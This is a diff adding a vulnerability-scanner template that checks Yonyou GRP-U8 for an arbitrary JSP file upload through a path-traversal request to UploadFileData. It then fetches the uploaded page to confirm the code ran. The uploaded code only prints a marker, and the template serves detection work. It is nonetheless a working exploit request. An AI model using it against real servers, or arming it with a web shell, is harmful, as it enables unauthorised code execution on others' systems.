@@ -1,0 +1,33 @@
+name: yongyou-grp-u8-uploadfiledata
+set:
+  randstr: randomLowercase(5)
+  randbody: randomLowercase(28)
+  rboundary: randomLowercase(8)
+rules:
+  - method: POST
+    path: "/UploadFileData?action=upload_file&&foldername=/..&filename=/{{randstr}}.jsp"
+    headers:
+      DNT: 1
+      Connection: close
+      Upgrade-Insecure-Requests: 1
+      Accept-Encoding: gzip
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Accept-Encoding: gzip, deflate
+      Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
+    body: "\
+      --WebKitFormBoundary{{rboundary}}\r\n\
+      Content-Disposition: form-data; name=\"file\"; filename=\"{{randstr}}.jsp\"\r\n\
+      Content-Type: image/png\r\n\
+      \r\n\
+      <% out.println(\"Hello yongyouU8 {{randbody}}\");%>\r\n\
+      --WebKitFormBoundary{{rboundary}}--\r\n\
+      "
+    expression: |
+      response.status == 200 && response.body.bcontains(b'parent.showSucceedMsg();') && response.body.bcontains(b'parent.openWin.location.reload();')
+  - method: GET
+    path: "/R9iPortal/{{randstr}}.jsp"
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(randbody))
+detail:
+  author: 666
